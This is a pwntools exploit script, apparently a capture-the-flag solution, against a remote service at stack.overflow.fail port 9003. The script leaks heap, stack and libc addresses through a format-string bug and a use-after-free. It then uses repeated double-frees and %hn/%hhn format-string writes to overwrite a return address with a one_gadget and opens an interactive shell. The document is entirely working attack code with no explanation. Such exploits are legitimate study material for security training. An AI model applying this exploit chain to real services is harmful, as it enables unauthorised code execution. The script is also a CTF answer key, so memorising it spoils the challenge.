from pwn import *
def cmd(c):
	p.sendlineafter(">",str(c))
def name(s,n=0):
	cmd(1)
		
	if n==1:
		p.sendafter("name?\n",s)
	else:
		p.sendlineafter("name?\n",s)
def add(idx):
	cmd(2)
	p.sendlineafter("gle\n",str(idx))
def show():
	cmd(4)
def free(idx):
	cmd(3)
	p.sendlineafter("remove\n",str(idx))
#context.log_level='debug'
#p=process("./pwnable",env={"LD_PRELOAD":"./libc"})
p=remote("stack.overflow.fail",9003)
add(3)
add(3)
add(3)
add(3)
show()
p.readuntil("m Melt")
heap=u64(p.readline()[:-1].ljust(8,'\x00'))-0x70
log.info(hex(heap))

free(3)
free(1)
free(2)
free(1)
free(0)
name(p64(0xcafebabe))
name(p64(0xdeadbeef))
name(p64(heap))
name(p64(0xdeadbeef))
name(p64(0xdeadbeef))
name(p64(0x603130-0x603000+heap)+p64(0x603130-0x603000+heap)+p64(0x603040-0x603000+heap)+p64(0x01))

name("%p|%p*%25$p")
show()
p.readuntil("#0: ")
stack=int(p.readuntil("|")[:-1],16)
base=int(p.readuntil("*")[:-1],16)-(0x7ffff7dd3780-0x00007ffff7a0d000)

name(p64(0x7fffffffde58-0x7fffffffb730+stack))
late=0x7fffffffde58-0x7fffffffb730+stack
late=(late&0xffff)
free(0)

add(3)
add(3)
add(3)
add(3)
free(3)
free(1)
free(2)
free(1)
free(0)
name(p64(0xcafebabe))
name(p64(0xdeadbeef))
name(p64(heap))
name(p64(0xdeadbeef))
name("%{}c%27$hn".format(late))
name(p64(0x6031f0-0x603000+heap)+p64(0x6031f0-0x603000+heap)+p64(0x603160-0x603000+heap)+p64(0x01))
show()
free(0)
## point to ret_address over 
# one_gadget
aim=0x45216+base
p1=aim&0xffff
p2=(aim>>16)&0xffff
log.warning(hex(aim))
log.warning(hex(p1))
log.warning(hex(p2))

add(3)
add(3)
add(3)
add(3)
free(3)
free(1)
free(2)
free(1)
free(0)
name(p64(0xcafebabe))
name(p64(0xdeadbeef))
name(p64(heap))
name(p64(0xdeadbeef))
name("%{}c%53$hn".format(p1))

name(p64(0x6032b0-0x603000+heap)+p64(0x6032b0-0x603000+heap)+p64(0x603160-0x603000+heap)+p64(0x01))
show()
free(0)
#last two bytes
add(3)
add(3)
add(3)
add(3)
free(3)
free(1)
free(2)
free(1)
free(0)
name(p64(0xcafebabe))
name(p64(0xdeadbeef))
name(p64(heap))
name(p64(0xdeadbeef))
name("%{}c%27$hhn".format(0x5a))
name(p64(0x603370-0x603000+heap)+p64(0x603360-0x603000+heap)+p64(0x603160-0x603000+heap)+p64(0x01))
show()
free(0)


add(3)
add(3)
add(3)
add(3)
free(3)
free(1)
free(2)
free(1)
free(0)
name(p64(0xcafebabe))
name(p64(0xdeadbeef))
name(p64(heap))
name(p64(0xdeadbeef))
#
name("%{}c%53$hhn".format(p2))
#
name(p64(0x603430-0x603000+heap)+p64(0x603430-0x603000+heap)+p64(0x603160-0x603000+heap)+p64(0x01))

show()
free(0)


#gdb.attach(p,'b *0x000000000400CCD')

cmd(5)
log.warning(hex(stack))
log.warning(hex(base))
log.warning(hex(aim))
p.interactive()
#53
